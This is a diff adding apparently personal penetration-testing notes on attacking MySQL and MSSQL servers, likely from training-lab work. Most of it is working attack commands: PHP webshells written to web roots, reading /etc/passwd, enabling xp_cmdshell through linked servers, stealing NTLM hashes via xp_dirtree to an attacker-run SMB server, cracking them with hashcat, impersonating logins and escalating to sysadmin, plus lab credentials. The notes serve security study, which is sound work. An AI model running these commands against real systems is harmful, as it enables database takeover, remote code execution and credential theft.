@@ -1,0 +1,254 @@
+CONNECTING TO MYSQL:
+mysql -u julio -pPassword123 -h 10.129.20.13
+
+AND SQLCMD:
+sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+
+AND SQSH:
+sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+
+AND MSSQL:
+mssqlclient.py -p 1433 julio@10.129.203.7 
+
+
+========================================
+STEPS FOR FINESSING SQL INJECTIONS:
+1. Use Burp, and send all requests to INTRUDER
+2. Use PAYLOADS (I've had success w/ error-based)
+3. Look at the response in INTRUDER, and check the Render
+4. Figure out the back-end behavior via the RESPONSE
+5. Trial + error working payloads
+
+========================================
+
+MySQL default system schemas/databases:
+
+mysql - is the system database that contains tables that store information required by the MySQL server
+information_schema - provides access to database metadata
+performance_schema - is a feature for monitoring MySQL Server execution at a low level
+sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
+
+Write local file:
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+finding files similar to secure_file_priv:
+mysql> show variables like "secure_file_priv";
+
+Reading local files:
+mysql> select LOAD_FILE("/etc/passwd");
+
+Traversal commands:
+SHOW DATABASES;
+USE target_db;
+SHOW TABLES;
+
+
+
+
+MSSQL default system schemas/databases:
+
+master - keeps the information for an instance of SQL Server.
+msdb - used by SQL Server Agent.
+model - a template database copied for each new database.
+resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
+tempdb - keeps temporary objects for SQL queries.
+
+NAVIGATING MSSQL:
+list databases:
+SELECT name FROM sys.databases;
+
+change a database:
+USE targetdb;
+
+list tables in current db:
+SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
+
+reading all from a table:
+SELECT * FROM {Table-name}
+
+!!! FOR ALL THINGS NUMBERED, that's SQLCMD - Use that, not impacket !!!
+
+MSSQL - ENABLE OLE AUTOMATION PROCEDURES
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+
+Then you can create files:
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+
+Reading local files:
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+
+
+NUANCE WITH SQLCMD:
+If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
+
+1> SELECT name FROM master.dbo.sysdatabases
+2> GO
+
+
+XP_CMDSHELL
+xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing sp_configure
+The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account
+
+1> xp_cmdshell 'whoami'
+2> GO
+
+
+How to enable if you have sysadmin (in this case we don't, but the command will allow)
+1> EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+1> reconfigure
+2> go
+1> EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+1>reconfigure
+2> go
+
+
+Finding things w/ xp_cmdshell:
+1> exec('xp_cmdshell ''where /r C:\ flag.txt''') at [LOCAL.TEST.LINKED.SRV]
+2> go
+
+
+
+===================================================
+
+STEALING HASHES IN MSSQL:
+You can steal the MSSQL service account hash using xp_subdirs or xp_dirtree! You can then crack the hash;
+Does on the current user activated
+
+Or Using Responder:
+sudo responder -I tun0
+(starts the server on local machine)
+
+XP_SUBDIRS Hash Stealing with impacket:
+sudo impacket-smbserver share ./ -smb2support
+(starts the server on local machine)
+
+!!! FINAL STEP FOR HASH STEALING !!!
+
+XP_DIRTREE Hash Stealing
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
+
+XP_SUBDIRS Hash Stealing
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+
+
+TO CRACK:
+1. Take the NTLMv2-SSP Hash (whole line after :)
+2. put into a file
+3. crack w/ hashcat using -m 5600
+
+*NOTE, if using impacket mssqlclient.py, sometimes you need to add -windows-auth if they are expecting encryption on a password
+
+
+
+NAVIGATING MSSQL IN SQLCMD!!!
+listing databases:
+1> SELECT name FROM sys.databases;
+2> GO
+
+use a database
+1> USE MyDatabase;
+2> GO
+
+show current database/user
+1> SELECT DB_NAME() AS CurrentDB, SUSER_SNAME() AS CurrentUser;
+2> GO
+
+listing tables in current database:
+1> SELECT TABLE_SCHEMA, TABLE_NAME
+2> FROM INFORMATION_SCHEMA.TABLES
+3> WHERE TABLE_TYPE='BASE TABLE';
+4> GO
+
+listing columns for a table
+1> SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE
+2> FROM INFORMATION_SCHEMA.COLUMNS
+3> WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME='MyTable';
+4> GO
+
+====================================================
+
+IMPERSONATING EXISTING USERS WITH MSSQL:
+SQL has a special permission called 'IMPERSONATE'
+
+Listing all logins:
+SELECT name, type_desc FROM sys.server_principals;
+
+Identify users to impersonate:
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+Veryifying our current user and role:
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+Logging in as the user:
+1> EXECUTE AS LOGIN = 'user_name_here'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+COMMUNICATING WITH OTHER DATABASES USING MSSQL:
+(this will show other configures SQL servers or databases linked)
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+
+
+SENDING COMMANDS THROUGH OTHER DATABASES/SERVERS THROUGH MSSQL:
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+
+or if you want to check current db/user:
+1> EXECUTE('SELECT DB_NAME() AS CurrentDB, SUSER_SNAME() AS CurrentUser;') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+
+===========================================
+
+!!!SQLCMD PRIVILEGE ESCALATION!!!
+what I used
+1> execute('EXEC sp_addsrvrolemember "WIN-HARD\Fiona, sysadmin;') at [LOCAL.TEST.LINKED.SRV]
+
+
+===================
+== SQL INJECTION ==
+===================
+
+
+This one is for MySQL, and is a WEBSHELL:
+(the output file should be a known directory/file that holds the server files (it should be accessible from the browser)
+(sometimes this is trial-and-error, so gather as many suspected directories to put into this command)
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php'
+
+Then you can go to the appropriate http or https (try both) using:
+http://inlanefreight.htb/test2.php?c=dir%20C:\Users\Administrator\Desktop
+
+Or you can execute commands:
+http://inlanefreight.htb/bingus.php?c=whoami
+
+Or you can read files:
+http://inlanefreight.htb/bingus.php?c=type bingus.txt
+
+** NOTE: test2.php can be named whatever you like it as long as it has .php
